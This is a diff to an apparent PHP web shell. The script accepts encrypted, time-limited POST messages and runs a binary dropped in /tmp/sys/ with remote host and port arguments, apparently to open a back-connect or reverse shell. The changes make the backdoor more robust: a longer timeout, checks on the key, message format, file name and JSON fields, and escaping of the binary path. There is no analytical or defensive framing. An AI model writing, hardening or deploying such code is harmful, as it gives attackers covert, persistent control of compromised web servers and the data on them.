@@ -1,7 +1,7 @@
 
 <?php
 $mid = "@MID";
-$timeout = 5;
+$timeout = 30;
 
 function base64url_decode($data) {
     $base64 = str_replace(['-', '_'], ['+', '/'], $data);
@@ -23,6 +23,9 @@ function getTimestamp() {
 function xor_decrypt($data, $key) {
     $decrypted = '';
     $key_length = strlen($key);
+    if ($key_length === 0) {
+        return '';
+    }
     for ($i = 0; $i < strlen($data); $i++) {
         $decrypted .= chr(ord($data[$i]) ^ ord($key[$i % $key_length]));
     }
@@ -30,15 +33,27 @@ function xor_decrypt($data, $key) {
 }
 
 function decrypt($data) {
-    list($_,$b1, $b2) = explode('.', $data);
+    if ($GLOBALS['mid'] === '' || $GLOBALS['mid'] === '@MID') {
+        return false;
+    }
+    $parts = explode('.', $data, 3);
+    if (count($parts) !== 3) {
+        return false;
+    }
+    list($_, $b1, $b2) = $parts;
     $b2_ = base64url_decode($b2);
+    if ($b2_ === false || $b2_ === '') {
+        return false;
+    }
     $b2_time = xor_decrypt($b2_, reverseString($GLOBALS['mid']));
     if (!ctype_digit($b2_time) || getTimestamp() - $b2_time >= $GLOBALS['timeout']) {
-        return False;
+        return false;
     }
     $b1_ = base64url_decode($b1);
-    $b1_d = xor_decrypt($b1_, $GLOBALS['mid']);
-    return $b1_d;
+    if ($b1_ === false) {
+        return false;
+    }
+    return xor_decrypt($b1_, $GLOBALS['mid']);
 }
 
 function tyrant($uid, $rhost, $rport) {
@@ -53,16 +68,17 @@ function tyrant($uid, $rhost, $rport) {
         return 4131;
     }
 
-    $file_name = trim(file_get_contents($file_path));
-    if (!$file_name) {
+    $file_name = trim((string) file_get_contents($file_path));
+    if (!preg_match('/^[a-fA-F0-9]{32}$/', $file_name)) {
         return 4131;
     }
 
     $escaped_uid = escapeshellarg($uid);
     $escaped_rhost = escapeshellarg($rhost);
     $escaped_rport = escapeshellarg($rport);
+    $escaped_bin = escapeshellarg('/tmp/sys/' . $file_name);
 
-    exec("/tmp/sys/$file_name -uid $escaped_uid -rhost $escaped_rhost -rport $escaped_rport", $output, $status);
+    exec("$escaped_bin -uid $escaped_uid -rhost $escaped_rhost -rport $escaped_rport", $output, $status);
     return ($status === 0) ? 4132 : 4131;
 }
 
@@ -82,7 +98,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         if ($decrypted_message) {
             $json_data = json_decode($decrypted_message, true);
 
-            if (isset($json_data['id']) && check_id($json_data['id'])) {
+            if (is_array($json_data) && isset($json_data['id'], $json_data['uid'], $json_data['rhost'], $json_data['rport']) && check_id($json_data['id'])) {
                 $status_code = tyrant($json_data['uid'], $json_data['rhost'], $json_data['rport']);
             } else {
                 $status_code = 4130;
